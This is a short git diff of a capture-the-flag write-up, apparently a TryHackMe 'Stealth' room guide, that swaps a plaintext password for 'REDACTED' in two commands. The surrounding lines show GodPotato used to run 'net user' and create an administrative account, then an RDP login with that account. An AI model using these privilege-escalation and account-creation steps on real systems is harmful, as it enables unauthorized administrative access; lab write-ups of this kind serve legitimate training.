@@ -94,7 +94,7 @@ Removed for brevity
 ```
 Using GodPotato to execute system commands, an administrative user was created:
 ```powershell
-evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net user tester Password123 /add"
+evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net user tester REDACTED /add"
 Removed for brevity
 [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
 [*] CurrentsImpersonationLevel: Impersonation
@@ -142,7 +142,7 @@ The command completed successfully.
 ```
 With the `tester` account in the Administrators group, RDP into the hose was achieved:
 ```bash
-xfreerdp3 /v:HostEvasion /u:tester /p:Password123
+xfreerdp3 /v:HostEvasion /u:tester /p:REDACTED
 ```  
 ![RDP - start.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Stealth/Images/RDP%20-%20start.png)  
 
